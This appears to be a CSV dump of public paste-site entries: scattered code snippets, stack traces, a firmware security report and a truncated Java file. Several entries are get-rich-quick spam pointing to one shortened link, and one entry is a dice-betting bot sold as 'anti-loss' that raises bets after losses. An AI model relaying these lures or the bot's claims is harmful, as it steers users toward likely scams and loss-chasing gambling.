id,title,username,language,date,content
G72YcnP0,Make $1000 15-MINUTES  (BEGINNER) ME,awesomemariobros,JavaScript,Sunday 27th of April 2025 12:58:17 PM CDT," 
Pdf https://tinyurl.com/privguidee

d00BQylzIO
"
SYWLtqUy,Untitled,BlixerCoreProjecks,BrainFuck,Sunday 27th of April 2025 12:55:18 PM CDT,++++++++++[>++++++++++++>++++++++++++>+++++>++++++>+++++>+++++++++++>+++++>++++++>+++++++++++>++++++++++++>+++++++++++>++++++++++++>+++++++++++>+++++++++++>++++++++++>++++++++++++>++++++++++++>++++++++++++>++++++++++>+++++>+++++>++++++>++++++++++>+++++>+++++>+++++<<<<<<<<<<<<<<<<<<<<<<<<<<-]>+.>.>.>---.>+.>-----.>.>---.>---.>.>.>-.>----.>.>.>---.>-.>---.>++++..>.>+.>----.>++++.>++.>.>++.
uFwVL68U,EARN $900 INSTANTLY 2025 M6,awesomemariobros,JavaScript,Sunday 27th of April 2025 12:48:55 PM CDT," 
Pdf https://tinyurl.com/privguidee

bUElaU1zxo
"
Q84DvT7n,Untitled,Hackdicecode,C++,Sunday 27th of April 2025 12:41:47 PM CDT,"// DiceBot - Anti-Loss with Recovery Chance (23-33%)
// Recovery Mode activates after losses for better odds

// ===== BASE SETTINGS =====
baseBet = 0.0001        // Starting bet amount
minBaseChance = 23      // Base min win chance (23%)
maxBaseChance = 33      // Base max win chance (33%)

// ===== RECOVERY MODE SETTINGS =====
recoveryMinChance = 40  // Min chance in recovery (40%)
recoveryMaxChance = 50  // Max chance in recovery (50%)
recoveryTrigger = 2     // Activate after X losses

// ===== BET MANAGEMENT =====
lossIncrease = 1.3      // Bet increase after loss (conservative)
winDecrease = 0.8       // Bet decrease after win
maxLossStreak = 5       // Stop after X losses
maxWinStreak = 3        // Reduce bet after X wins

// ===== INTERNAL VARIABLES =====
currentBet = baseBet
lossCount = 0
winCount = 0
inRecovery = false

// ===== FUNCTIONS =====
function getWinChance() {
    if (inRecovery) {
        return recoveryMinChance + (Math.random() * (recoveryMaxChance - recoveryMinChance))
    } else {
        return minBaseChance + (Math.random() * (maxBaseChance - minBaseChance))
    }
}

function getPayoutMultiplier(chance) {
    return (100 / chance).toFixed(2)
}

function getBetVariation() {
    return 0.9 + (Math.random() * 0.2) // 0.9x to 1.1x variation
}

// ===== BET LOGIC =====
function doBet() {
    if (lossCount >= maxLossStreak) {
        stop(""🛑 STOP-LOSS: Max loss streak reached!"")
    }

    // Check if recovery mode should activate
    if (lossCount >= recoveryTrigger && !inRecovery) {
        inRecovery = true
        log(""🔁 RECOVERY MODE ACTIVATED (Higher Win Chance)"")
    }

    // Get current win chance & calculate payout
    winChance = getWinChance()
    multiplier = getPayoutMultiplier(winChance)
    betAmount = currentBet * getBetVariation()

    log(""🎲 Bet: "" + betAmount.toFixed(8) + "" | Chance: "" + winChance.toFixed(1) + ""% ("" + multiplier + ""x) "" + (inRecovery ? ""🔥"" : """"))
    bet(betAmount, multiplier)
}

// ===== RESULT HANDLING =====
function onBetResult(won, amount) {
    if (won) {
        winCount++
        lossCount = 0

        // Exit recovery mode on win
        if (inRecovery) {
            inRecovery = false
            log(""✅ RECOVERY SUCCESS - Back to normal mode"")
        }

        // Reduce bet after winning streak
        if (winCount >= maxWinStreak) {
            currentBet = Math.max(baseBet, currentBet * winDecrease)
            winCount = 0
            log(""💰 WIN STREAK - Reducing bet"")
        }
    } else {
        lossCount++
        winCount = 0
        currentBet = (currentBet * lossIncrease) * getBetVariation()
    }

    // Ensure bet doesn't go too low
    if (currentBet < baseBet) currentBet = baseBet
}"
SARiDp8z,Line,RTS_Dmitriy,Lua,Sunday 27th of April 2025 12:41:14 PM CDT,"for i = 1,7 do
  -- СЮДА
  turtle.placeDown()
  turtle.forward()
end
"
pA0ZiqD1,Make $1000 15-MINUTES (BEGINNER) 96,awesomemariobros,JavaScript,Sunday 27th of April 2025 12:39:38 PM CDT," 
Pdf https://tinyurl.com/privguidee

Mq86f0orih
"
0ihDS5E3,EARN $900 INSTANTLY 2025⭐ NU,awesomemariobros,JavaScript,Sunday 27th of April 2025 12:30:23 PM CDT," 
Pdf https://tinyurl.com/privguidee

guN1WXNfDH
"
28EmKbYC,EARN $900 INSTANTLY 2025⭐ NU,egio2345,JavaScript,Sunday 27th of April 2025 12:29:25 PM CDT," 
Pdf https://tinyurl.com/privguidee

MifqEOX1Kk
"
DRVdXrnb,printer,RTS_Dmitriy,Lua,Sunday 27th of April 2025 12:22:21 PM CDT,print('Dima')
FTWAPDpz,EARN $900 INSTANTLY 2025⭐ NU,henchaasiacs,JavaScript,Sunday 27th of April 2025 12:18:54 PM CDT," 
Pdf https://tinyurl.com/privguidee

QQgbR9a1X2
"
RhRuG5bF,2025-04-27T19:17:28.051449,powerampache,PHP,Sunday 27th of April 2025 12:17:29 PM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.13.246.210 (port 49612) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

"
EL7K7D0J,Make $1000 15-MINUTES  (BEGINNER) ME,henchaasiacs,JavaScript,Sunday 27th of April 2025 12:09:39 PM CDT," 
Pdf https://tinyurl.com/privguidee

m53kldFKNs
"
swTx4FKt,C# easy Singleton Cache Pattern,heinrich23,C#,Sunday 27th of April 2025 11:32:02 AM CDT,"using Newtonsoft.Json;
using StackExchange.Redis;
using System.Configuration;
using System.Collections.Concurrent;
using System.Text;
using System.Web;

namespace Area23.At.Framework.Core.Cache
{

    /// <summary>
    /// CacheTypVal any cached value.
    /// Use default empty ctor <see cref=""CacheTypVal()""/> and
    /// <see cref=""SetValue{T}(T)""/> to set the cached value;
    /// setting cache value via <see cref=""CacheTypVal(object, Type)""/> ctor is obsolete.
    /// Use <see cref=""GetValue{T}""/> to get the cached value
    /// </summary>
    public class CacheTypVal
    {

        protected internal object? _Value { get; set; }
        protected internal Type? _Type { get; set; }

        /// <summary>
        /// Empty default ctor
        /// </summary>
        public CacheTypVal()
        {
            _Type = null;
            _Value = null;
        }

        /// <summary>
        /// Obsolete ctor, please use default empty ctor <see cref=""CacheTypVal()""/> 
        /// and then <see cref=""SetValue{T}(T)""/> to set a cached value instead.
        /// </summary>
        /// <param name=""ovalue""><see cref=""object"" /> ovalue</param>
        /// <param name=""atype""><see cref=""Type""/> atype</param>
        [Obsolete(""Don't use ctor CacheTypeValue(object, Type) to set a cache value, use SetValue<T>(T tvalue) instead."", false)]
        public CacheTypVal(object ovalue, Type atype)
        {
            _Type = atype;
            _Value = ovalue;
        }

        /// <summary>
        /// gets the <see cref=""Type""/> of generic cached value
        /// </summary>
        /// <returns><see cref=""Type""/> of generic value or null if cached value is <see cref=""null""/></returns>
        public Type? GetType()
        {
            return _Type;
        }

        /// <summary>
        /// Get a value from cache
        /// </summary>
        /// <typeparam name=""T"">generic type of value passed by typeparameter</typeparam>
        /// <returns>generic T value</returns>
        /// <exception cref=""InvalidOperationException"">thrown, when cached value isn't of typeof(T)</exception>
        public T? GetValue<T>()
        {
            T? tvalue;
            if (typeof(T) == _Type)
                tvalue = (T?)_Value;
            else
                throw new InvalidOperationException($""typeof(T) = {typeof(T)} while _type = {_Type}"");

            return tvalue ?? default(T);
        }

        /// <summary>
        /// Sets a generic cached value
        /// </summary>
        /// <typeparam name=""T"">generic type of value passed by typeparameter</typeparam>
        /// <param name=""tvalue"">generic value to set cached</param>
        public void SetValue<T>(T tvalue)
        {
            _Type = typeof(T);
            _Value = (object)tvalue;
        }

    }


    /// <summary>
    /// MemCache an application cache implemented saved in memory only at runtime
    /// derive from <see cref=""MemCache""/> and implement your own cache by implementing a new variant 
    /// </summary>
    public abstract class MemCache
    {

        public const string APP_CONCURRENT_DICT = ""APP_CONCURRENT_DICT"";

        protected internal static readonly Lazy<MemCache> _instance;
        public static MemCache CacheDict => _instance.Value;

        /// <summary>
        /// private <see cref=""ConcurrentDictionary{string, CacheTypeValue}""/> 
        /// </summary>
        protected internal static ConcurrentDictionary<string, CacheTypVal> _appCache = new ConcurrentDictionary<string, CacheTypVal>();

        /// <summary>
        /// public property get accessor for <see cref=""_appCache""/> stored in <see cref=""AppDomain.CurrentDomain""/>
        /// </summary>
        protected virtual ConcurrentDictionary<string, CacheTypVal> AppCache
        {
            get
            {
                // _appCache =  (ConcurrentDictionary<string, CacheTypVal>) get it where to get it
                if (_appCache == null)
                {
                    _appCache = new ConcurrentDictionary<string, CacheTypVal>();
                    // where to set it _appCache
                }
                return _appCache;
            }
            set
            {
                if (value != null && value.Count > 0)
                    _appCache = value;
                // if (_appCache != null && _appCache.Count > 0)
                //      set it where to set it _appCache
            }
        }

        /// <summary>
        /// Get all keys from <see cref=""AppCache""/> which is implemented as a <see cref=""ConcurrentDictionary{string, CacheTypVal}""/>
        /// </summary>
        public virtual string[] AllKeys { get => AppCache.Keys.ToArray(); }

        /// <summary>
        /// static ctor
        /// </summary>
        static MemCache()
        {
            if (ConfigurationManager.AppSettings[""PersistMsgIn""] != null)
            {
                string persistMsgIn = (string)ConfigurationManager.AppSettings[""PersistMsgIn""];
                switch (persistMsgIn)
                {
                    case ""ApplicationState"":
                    case ""JsonFile"":
                        _instance = new Lazy<MemCache>(() => new JsonCache());
                        break;
                    case ""AmazonElasticCache"":
                        // TODO: Redis
                        _instance = new Lazy<MemCache>(() => new RedisCache());
                        break;
                    case ""AppDomainData"":
                    default:
                        _instance = new Lazy<MemCache>(() => new AppDomainCache());
                        break;
                }
            }
            else
            {
                _instance = new Lazy<MemCache>(() => new JsonCache());
            }
        }


        /// <summary>
        /// Static constructor
        /// </summary>
        public MemCache()
        {
            _appCache = new ConcurrentDictionary<string, CacheTypVal>();
        }

        /// <summary>
        /// Gets a value from <see cref=""ConcurrentDictionary<string, CacheTypVal>""/> stored <see cref=""System.AppDomain.CurrentDomain""/>
        /// </summary>
        /// <typeparam name=""T"">generic type of cached value</typeparam>
        /// <param name=""ckey"">cache key</param>
        /// <returns>generic cached value stored at key</returns>
        public virtual T GetValue<T>(string ckey)
        {
            if (AppCache.ContainsKey(ckey) && AppCache.TryGetValue(ckey, out var cvalue))
                return cvalue.GetValue<T>();

            return default(T);
        }

        /// <summary>
        /// Sets a generic value to <see cref=""ConcurrentDictionary<string, CacheTypVal>""/> stored <see cref=""System.AppDomain.CurrentDomain""/>
        /// </summary>
        /// <typeparam name=""T"">generic type of cached value</typeparam>
        /// <param name=""ckey"">cache key</param>
        /// <param name=""cvalue"">generic value to stored at key in cache</param>
        /// <returns>true, if add or updated succeeded, otherwise false</returns>
        public virtual bool SetValue<T>(string ckey, T tvalue)
        {
            bool addedOrUpdated = false;

            if (string.IsNullOrEmpty(ckey) || tvalue == null)
                return false;

            CacheTypVal cvalue = new CacheTypVal();
            cvalue.SetValue<T>(tvalue);

            if (!AppCache.ContainsKey(ckey))
                addedOrUpdated = AppCache.TryAdd(ckey, cvalue);
            else if (AppCache.TryGetValue(ckey, out CacheTypVal oldValue))
                addedOrUpdated = _appCache.TryUpdate(ckey, cvalue, oldValue);

            // MAYBE SHORTER BUT NOBODY CAN QUICK READ AND UNDERSTAND THIS
            // addedOrUpdated = (!AppCache.ContainsKey(ckey)) ? AppCache.TryAdd(ckey, cvalue) : 
            //    (AppCache.TryGetValue(ckey, out CacheTypVal oldValue)) ? _appCache.TryUpdate(ckey, cvalue, oldValue) : false;

            if (addedOrUpdated)
                AppCache = _appCache;  // saves the modified ConcurrentDictionary{string, CacheTypVal} back to AppDomain

            return addedOrUpdated;
        }

        /// <summary>
        /// Looks, if  <see cref=""ConcurrentDictionary{string, CacheTypVal}""/>  contains the key
        /// </summary>
        /// <param name=""ckey"">lookup key</param>
        /// <returns>true, if ckey is not null or empty and <see cref=""AppCache""/> contains ckey, otherwise false</returns>
        public virtual bool ContainsKey(string ckey)
        {
            return (!string.IsNullOrEmpty(ckey) && AppCache.ContainsKey(ckey));
        }

        /// <summary>
        /// RemoveKey removes a key value pair from <see cref=""AppCache""/>
        /// </summary>
        /// <param name=""ckey"">key to remove</param>
        /// <returns>true, if key value pair was successfully removed or <see cref=""AppCache""/> doesn't contain anymore ckey;
        /// false if ckey is <see cref=""null""/> or <see cref=""string.Empty""/> or removing ckey from <see cref=""ConcurrentDictionary{string, CacheTypVal}""/> failed.</returns>
        public virtual bool RemoveKey(string ckey)
        {
            if (string.IsNullOrEmpty(ckey))
                return false;

            if (!AppCache.ContainsKey(ckey))
                return true;

            if (!AppCache.TryRemove(ckey, out CacheTypVal cvalue))
                return false;

            AppCache = _appCache; // saves the modified ConcurrentDictionary{string, CacheTypVal} back to AppDomain

            return true;
        }

    }


    /// <summary>
    /// JsonCache an application cache implemented with <see cref=""ConcurrentDictionary{string, CacheTypVal}""/> serialized with json    
    /// </summary>
    public class JsonCache : MemCache
    {

        //protected internal static readonly Lazy<MemCache> _instance = new Lazy<MemCache>(() => new JsonCache());
        //public static MemCache CacheDict => _instance.Value;

        const int INIT_SEM_COUNT = 1;
        const int MAX_SEM_COUNT = 1;        
        const string JSON_APPCACHE_FILE = ""AppCache.json"";
        readonly string JsonFullDirPath = Path.Combine(Environment.GetEnvironmentVariable(""LOCALAPPDATA""), ""TEMP"");
        readonly string JsonFullFilePath = Path.Combine(Environment.GetEnvironmentVariable(""LOCALAPPDATA""), ""TEMP"", JSON_APPCACHE_FILE);

        internal static SemaphoreSlim ReadWriteSemaphore = new SemaphoreSlim(INIT_SEM_COUNT, MAX_SEM_COUNT);        

        protected static JsonSerializerSettings JsonSettings = new JsonSerializerSettings()
        {
            Formatting = Formatting.Indented,
            MaxDepth = 16,
            NullValueHandling = NullValueHandling.Include,
            MissingMemberHandling = MissingMemberHandling.Ignore,
            ObjectCreationHandling = ObjectCreationHandling.Auto,
            DateFormatHandling = DateFormatHandling.IsoDateFormat,
            DateParseHandling = DateParseHandling.DateTime,
            PreserveReferencesHandling = PreserveReferencesHandling.All,
            ConstructorHandling = ConstructorHandling.AllowNonPublicDefaultConstructor
        };

        /// <summary>
        /// public property get accessor for <see cref=""_appCache""/> stored in <see cref=""AppDomain.CurrentDomain""/>
        /// </summary>
        protected override ConcurrentDictionary<string, CacheTypVal> AppCache
        {
            get
            {
                int semCnt = 0;
                try
                {
                    semCnt = ReadWriteSemaphore.CurrentCount;
                    ReadWriteSemaphore.Wait(128);

                    if (_appCache == null || _appCache.Count == 0)
                    {
                        if (!Directory.Exists(JsonFullDirPath))
                            Directory.CreateDirectory(JsonFullDirPath);

                        string jsonSerializedAppDict = (System.IO.File.Exists(JsonFullFilePath)) ? System.IO.File.ReadAllText(JsonFullFilePath) : """";
                        if (!string.IsNullOrEmpty(jsonSerializedAppDict))
                            _appCache = (ConcurrentDictionary<string, CacheTypVal>)JsonConvert.DeserializeObject<ConcurrentDictionary<string, CacheTypVal>>(jsonSerializedAppDict);
                    }

                    if (_appCache == null || _appCache.Count == 0)
                    {
                        _appCache = new ConcurrentDictionary<string, CacheTypVal>();
                        // set it, where to set it _appCache
                        string jsonDeserializedAppDict = JsonConvert.SerializeObject(_appCache, Formatting.Indented, JsonSettings);
                        System.IO.File.WriteAllText(JsonFullFilePath, jsonDeserializedAppDict, Encoding.UTF8);  
                    }
                }
                catch (Exception exGetRead)
                {
                    Console.WriteLine($""Exception {exGetRead.GetType()}: {exGetRead.Message} \r\n\t{exGetRead}"");
                }
                finally
                {
                    semCnt = ReadWriteSemaphore.Release();
                }
                return _appCache;
            }
            set
            {
                int semCnt = 0;
                try
                {
                    semCnt = ReadWriteSemaphore.CurrentCount;
                    ReadWriteSemaphore.Wait();

                    string jsonDeserializedAppDict = """";
                    if (value != null && value.Count > 0)
                    {
                        _appCache = value;

                        // set it, where to set it _appCache
                        jsonDeserializedAppDict = JsonConvert.SerializeObject(_appCache, Formatting.Indented, JsonSettings);
                        System.IO.File.WriteAllText(JsonFullFilePath, jsonDeserializedAppDict, Encoding.UTF8); 
                    }
                }
                catch (Exception exSetWrite)
                {
                    Console.WriteLine($""Exception {exSetWrite.GetType()}: {exSetWrite.Message} \r\n\t{exSetWrite}"");
                }
                finally
                {
                    semCnt = ReadWriteSemaphore.Release();
                }
            }
        }
    }


    /// <summary>
    /// JsonCache an application cache implemented with a <see cref=""ConcurrentDictionary{string, CacheTypVal}""/> 
    /// </summary>
    public class AppDomainCache : MemCache
    {

        /// <summary>
        /// public property get accessor for <see cref=""_appCache""/> stored in <see cref=""AppDomain.CurrentDomain""/>
        /// </summary>
        protected override ConcurrentDictionary<string, CacheTypVal> AppCache
        {
            get
            {
                _appCache = (ConcurrentDictionary<string, CacheTypVal>)AppDomain.CurrentDomain.GetData(APP_CONCURRENT_DICT);
                if (_appCache == null)
                {
                    _appCache = new ConcurrentDictionary<string, CacheTypVal>();
                    AppDomain.CurrentDomain.SetData(APP_CONCURRENT_DICT, _appCache);
                }

                return _appCache;
            }
            set
            {
                if (value != null && value.Count > 0)
                {
                    _appCache = value;
                    AppDomain.CurrentDomain.SetData(APP_CONCURRENT_DICT, _appCache);
                }
            }
        }

        public AppDomainCache()
        {
            if (AppCache == null) ;
        }
    }


    /// <summary>
    /// RedisCache AWS elastic valkey cache singelton connector
    /// </summary>
    public class RedisCache : MemCache
    {

        const string VALKEY_CACHE_HOST_PORT = ""cqrcachecqrxseu-53g0xw.serverless.eus2.cache.amazonaws.com:6379"";
        const string VALKEY_CACHE_APP_KEY = ""RedisValkeyCache"";
        const string ALL_KEYS = ""AllKeys"";

        private static readonly object _lock = new object();

        ConnectionMultiplexer connMux;
        ConfigurationOptions options;
        string endpoint = ""cqrcachecqrxseu-53g0xw.serverless.eus2.cache.amazonaws.com:6379"";
        StackExchange.Redis.IDatabase db;

        public static MemCache ValKey => _instance.Value;

        private static HashSet<string> _allKeys = new HashSet<string>();
        public override string[] AllKeys { get => GetAllKeys().ToArray(); }

        public static string EndPoint
        {
            get
            {
                ((RedisCache)(_instance.Value)).endpoint = VALKEY_CACHE_HOST_PORT; // v               
                if (ConfigurationManager.AppSettings != null && ConfigurationManager.AppSettings[VALKEY_CACHE_APP_KEY] != null)
                    ((RedisCache)(_instance.Value)).endpoint = (string)ConfigurationManager.AppSettings[VALKEY_CACHE_APP_KEY];
                return ((RedisCache)(_instance.Value)).endpoint;
            }
        }

        public static StackExchange.Redis.IDatabase Db
        {
            get
            {
                if (((RedisCache)(_instance.Value)).db == null)
                    ((RedisCache)(_instance.Value)).db = ConnMux.GetDatabase();

                return ((RedisCache)(_instance.Value)).db;
            }
        }

        public static StackExchange.Redis.ConnectionMultiplexer ConnMux
        {
            get
            {
                if (((RedisCache)(_instance.Value)).connMux == null)
                {
                    if (((RedisCache)(_instance.Value)).options == null)
                        ((RedisCache)(_instance.Value)).options = new ConfigurationOptions
                        {
                            EndPoints = { EndPoint },
                            Ssl = true
                        };
                    ((RedisCache)(_instance.Value)).connMux = ConnectionMultiplexer.Connect(((RedisCache)(_instance.Value)).options);
                }
                return ((RedisCache)(_instance.Value)).connMux;
            }
        }


        /// <summary>
        /// default parameterless constructor for RedisCacheValKey cache singleton 
        /// </summary>
        public RedisCache()
        {
            endpoint = VALKEY_CACHE_HOST_PORT; // ""cqrcachecqrxseu-53g0xw.serverless.eus2.cache.amazonaws.com:6379"";
            if (ConfigurationManager.AppSettings != null && ConfigurationManager.AppSettings[VALKEY_CACHE_APP_KEY] != null)
                endpoint = (string)ConfigurationManager.AppSettings[VALKEY_CACHE_APP_KEY];
            options = new ConfigurationOptions
            {
                EndPoints = { endpoint },
                Ssl = true
            };
            if (connMux == null)
                connMux = ConnectionMultiplexer.Connect(options);
            if (db == null)
                db = connMux.GetDatabase();
        }


        /// <summary>
        /// GetString gets a string value by RedisCache key
        /// </summary>
        /// <param name=""redIsKey"">key</param>
        /// <param name=""flags""><see cref=""CommandFlags""/></param>
        /// <returns>(<see cref=""string""/>) value for key redIsKey</returns>
        public string GetString(string redIsKey, CommandFlags flags = CommandFlags.None)
        {
            string redIsString = Db.StringGet(redIsKey, flags);
            return redIsString;
        }

        /// <summary>
        /// SetString set key with string value
        /// </summary>
        /// <param name=""redIsKey"">key for string/param>
        /// <param name=""redIsString""></param>
        /// <param name=""expiry""></param>
        /// <param name=""keepTtl""></param>
        /// <param name=""when""></param>
        /// <param name=""flags""></param>
        public bool SetString(string redIsKey, string redIsString, TimeSpan? expiry = null, bool keepTtl = false, When when = When.Always, CommandFlags flags = CommandFlags.None)
        {
            bool success = false;
            lock (_lock)
            {
                var allRedIsKeys = GetAllKeys();
                success = Db.StringSet(redIsKey, redIsString, expiry, when, flags);

                if (success && !allRedIsKeys.Contains(redIsKey))
                {
                    allRedIsKeys.Add(redIsKey);
                    string jsonVal = JsonConvert.SerializeObject(AllKeys);
                    success = Db.StringSet(ALL_KEYS, jsonVal, null, keepTtl, When.Always, CommandFlags.None);
                    _allKeys = allRedIsKeys;
                }
            }

            return success;
        }

        /// <summary>
        /// SetValue sets value to cache
        /// </summary>
        /// <typeparam name=""T"">typeparameter</typeparam>
        /// <param name=""ckey"">key to set</param>
        /// <param name=""tvalue"">generic value</param>
        /// <returns>success on true</returns>
        public override bool SetValue<T>(string ckey, T tvalue)
        {
            TimeSpan? expiry = null;
            bool keepTtl = false;
            When when = When.Always;
            CommandFlags flags = CommandFlags.None;
            string jsonVal = JsonConvert.SerializeObject(tvalue);
            bool success = SetString(ckey, jsonVal, expiry, keepTtl, when, flags);

            return success;
        }

        /// <summary>
        /// gets a generic class type T from redis cache with key
        /// </summary>
        /// <typeparam name=""T""></typeparam>
        /// <param name=""ckey"">rediskey</param>
        /// <returns>T value/returns>
        public override T GetValue<T>(string ckey)
        {
            CommandFlags flags = CommandFlags.None;
            string jsonVal = Db.StringGet(ckey, flags);
            T tval = default(T);
            if (jsonVal != null)
            {
                tval = JsonConvert.DeserializeObject<T>(jsonVal);
            }

            return tval;
        }

        /// <summary>
        /// DeleteKey delete entry referenced at key
        /// </summary>
        /// <param name=""redIsKey"">key</param>
        /// <param name=""flags""><see cref=""CommandFlags.FireAndForget""/> as default</param>
        public override bool RemoveKey(string redIsKey)
        {
            CommandFlags flags = CommandFlags.FireAndForget;
            lock (_lock)
            {
                var allRedIsKeys = GetAllKeys();
                if (allRedIsKeys.Contains(redIsKey))
                {
                    allRedIsKeys.Remove(redIsKey);
                    string jsonVal = JsonConvert.SerializeObject(allRedIsKeys.ToArray());
                    Db.StringSet(""AllKeys"", jsonVal, null, false, When.Always, flags);
                    _allKeys = allRedIsKeys;
                }
                try
                {
                    TimeSpan span = new TimeSpan(0, 0, 1);
                    Db.StringGetDelete(redIsKey, flags);
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine($""Exception {ex.GetType()}: {ex.Message}\r\n\t{ex}"");
                    return false;
                }
            }

            return true;
        }

        /// <summary>
        /// ContainsKey check if <see cref=""Constants.ALL_KEYS"">AllKeys</see> key contains element redIsKey
        /// </summary>
        /// <param name=""ckey"">redIsKey to search</param>
        /// <returns>true, if cache contains key, otherwise false</returns>
        public override bool ContainsKey(string ckey)
        {
            if (GetAllKeys().Contains(ckey))
            {
                string redIsString = Db.StringGet(ckey, CommandFlags.None);
                if (!string.IsNullOrEmpty(redIsString))
                    return true;
            }

            return false;
        }

        /// <summary>
        /// GetAllKeys returns <see cref=""HashSet{string}""/></string> <see cref=""_allKeys""/>
        /// </summary>
        /// <returns>returns <see cref=""HashSet{string}""/></string> <see cref=""_allKeys""/></returns>
        public static HashSet<string> GetAllKeys()
        {
            if (_allKeys == null || _allKeys.Count == 0)
            {
                string jsonVal = Db.StringGet(ALL_KEYS, CommandFlags.None);
                string[] keys = (jsonVal != null) ? JsonConvert.DeserializeObject<string[]>(jsonVal) : new string[0];
                if (keys != null && keys.Length > 0)
                    _allKeys = new HashSet<string>(keys);
            }

            return _allKeys;
        }
    }

}
"
wuniv989,2025-04-27T18:21:27.588483,powerampache,PHP,Sunday 27th of April 2025 11:21:27 AM CDT,"1.01-80-play (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""timeout"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1117)

"
F8YAPW55,relatorio_seguranca_27042025,wagnux,Bash,Sunday 27th of April 2025 11:11:26 AM CDT,"Device Security Report
======================

Report details
  Date generated:                                  2025-04-27 13:10:08
  fwupd version:                                   1.9.28

System details
  Hardware model:                                  Gigabyte Technology Co., Ltd. B550M AORUS ELITE
  Processor:                                       AMD Ryzen 5 5600G with Radeon Graphics
  OS:                                              Ubuntu 24.04.2 LTS
  Security level:                                  HSI:1! (v1.9.28)

HSI-1 Tests
  UEFI Bootservice Variables:                      Pass (Bloqueado)
  UEFI Platform Key:                               Pass (Válido)
  TPM v2.0:                                        Pass (Encontrado)
  UEFI Secure Boot:                                Pass (Habilitado)
  BIOS Firmware Updates:                           Pass (Habilitado)
  Fused Platform:                                  Pass (Bloqueado)
  TPM Platform Configuration:                      Pass (Válido)

HSI-2 Tests
  AMD Firmware Write Protection:                 ! Fail (Desabilitado)
  TPM Reconstruction:                              Pass (Válido)
  IOMMU Protection:                                Pass (Habilitado)
  Platform Debugging:                              Pass (Bloqueado)

HSI-3 Tests
  Suspend To RAM:                                ! Fail (Habilitado)
  Pre-boot DMA Protection:                       ! Fail (Desabilitado)
  AMD Firmware Replay Protection:                ! Fail (Sem suporte)
  Control-flow Enforcement Technology:             Pass (Suportado)
  Suspend To Idle:                               ! Fail (Desabilitado)

HSI-4 Tests
  Encrypted RAM:                                 ! Fail (Sem suporte)
  Supervisor Mode Access Prevention:               Pass (Habilitado)
  AMD Secure Processor Rollback Protection:      ! Fail (Desabilitado)

Runtime Tests
  Linux Kernel Verification:                     ! Fail (Comprometido)
  Firmware Updater Verification:                   Pass (Não comprometido)
  Linux Swap:                                    ! Fail (Não encriptado)
  Linux Kernel Lockdown:                           Pass (Habilitado)
  Control-flow Enforcement Technology:             Pass (Suportado)

Host security events
  2025-04-06 23:23:34   Linux Kernel Verification  ! Falhou (Não comprometido → Comprometido)
  2025-01-14 21:32:55   Linux Kernel Verification    Passou (Comprometido → Não comprometido)
  2024-12-12 21:51:00   Linux Kernel Verification  ! Falhou (Não comprometido → Comprometido)
  2024-09-27 20:55:03   Linux Kernel Verification    Passou (Comprometido → Não comprometido)
  2024-09-27 20:52:04   Linux Kernel Lockdown        Passou (Desabilitado → Habilitado)
  2024-09-27 20:52:04   UEFI Secure Boot             Passou (Desabilitado → Habilitado)
  2024-09-14 10:43:27   Linux Kernel Lockdown      ! Falhou (Habilitado → Desabilitado)
  2024-09-14 10:43:27   UEFI Secure Boot           ! Falhou (Habilitado → Desabilitado)
  2024-09-14 09:36:13   Linux Kernel Lockdown        Passou (Desabilitado → Habilitado)
  2024-09-14 09:36:13   UEFI Secure Boot             Passou (Desabilitado → Habilitado)
  2024-09-10 21:12:52   Linux Kernel Lockdown      ! Falhou (Habilitado → Desabilitado)
  2024-09-10 21:12:52   UEFI Secure Boot           ! Falhou (Habilitado → Desabilitado)
  2024-09-10 20:23:30   Linux Kernel Verification  ! Falhou (Não comprometido → Comprometido)
  2024-09-07 12:07:57   Control-flow Enforcement TechnologyPassou (Sem suporte → Suportado)
  2024-07-28 17:24:20   Linux Kernel Verification    Passou (Comprometido → Não comprometido)
  2024-07-28 17:12:01   Linux Kernel Verification  ! Falhou (Não comprometido → Comprometido)
  2024-07-28 16:39:57   Linux Kernel Lockdown        Passou (Desabilitado → Habilitado)
  2024-07-28 16:39:57   Linux Kernel Verification    Passou (Comprometido → Não comprometido)
  2024-07-28 16:39:57   UEFI Secure Boot             Passou (Desabilitado → Habilitado)
  2024-07-28 13:50:10   Linux Kernel Lockdown      ! Falhou (Habilitado → Desabilitado)
  2024-07-28 13:50:10   Linux Kernel Verification  ! Falhou (Não comprometido → Comprometido)
  2024-07-28 13:50:10   UEFI Secure Boot           ! Falhou (Habilitado → Desabilitado)
  2024-07-28 13:40:34   Linux Kernel Lockdown        Passou (Desabilitado → Habilitado)
  2024-07-28 13:40:34   Linux Kernel Verification    Passou (Comprometido → Não comprometido)
  2024-07-28 13:40:34   UEFI Secure Boot             Passou (Desabilitado → Habilitado)
  2024-07-01 05:46:32   Linux Kernel Lockdown      ! Falhou (Habilitado → Desabilitado)
  2024-07-01 05:46:32   UEFI Secure Boot           ! Falhou (Habilitado → Desabilitado)
  2024-06-29 22:37:50   Linux Kernel Verification  ! Falhou (Não comprometido → Comprometido)
  2024-06-29 20:50:09   Linux Kernel Verification    Passou (Comprometido → Não comprometido)
  2024-06-29 19:02:43   Linux Kernel Verification  ! Falhou (Não comprometido → Comprometido)

For information on the contents of this report, see https://fwupd.github.io/hsi.html"
t3ckcj94,[NP] Mapped Canvas,dzocesrce,Java,Sunday 27th of April 2025 11:09:42 AM CDT,"import java.io.*;
import java.util.*;
import java.util.stream.Collectors;
import java.io.*;
import java.util.*;
import java.util.stream.Collectors;
class InvalidIDException extends Exception{
